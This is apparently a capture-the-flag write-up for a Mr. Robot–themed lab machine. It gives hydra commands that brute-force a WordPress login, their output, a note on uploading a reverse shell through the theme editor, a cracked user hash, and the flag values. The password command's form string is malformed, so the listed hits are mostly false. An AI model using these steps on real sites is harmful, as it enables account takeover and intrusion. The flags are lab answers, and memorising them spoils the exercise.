@@ -1,0 +1,61 @@
+
+key 1
+
+robots.txt ---> 073403c8a58a1f80d943455fb30724b9
+
+key 2
+
+Bruteforcing login page:
+________________________
+
+
+1.Bruteforcing username with given wordlist:
+ 
+hydra -L fsocity.dic  -p test $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^wp-submit=Log+In:F=Invalid username"
+
+-------> Elliot
+
+2. Bruteforcing password with given wordlist:
+
+hydra -l Elliot -P fsocity.dic $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^wp-submit=Log+In:F=The password you entered for the username Elliot is incorrect."
+
+
+------->
+
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: page
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: http
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: Robot
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: Wikia
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: extensions
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: scss
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: styles
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: var
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: window
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: wikia
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: Elliot
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: now
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: false
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: true
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: from
+[80][http-post-form] host: 10.10.161.71   login: Elliot   password: the
+
+
+Now we can sort this passwords in a new file.
+
+and use it in wpscan.
+
+wpscan is failing...
+
+Uploaded Rev shell in the apperance portion of the websire of WP
+
+And executed it and got a shell
+
+robot:c3fcd3d76192e4007dfb496cca67e13b ---> hash
+
+cracked ---> abcdefghijklmnopqrstuvwxyz ----> logged in to robot user.
+
+Got the key2 ----> 822c73956184f694993bede3eb39f959
+
+Got key3 -----> 04787ddef27c3dee1ee161b21670b4e4
+
+
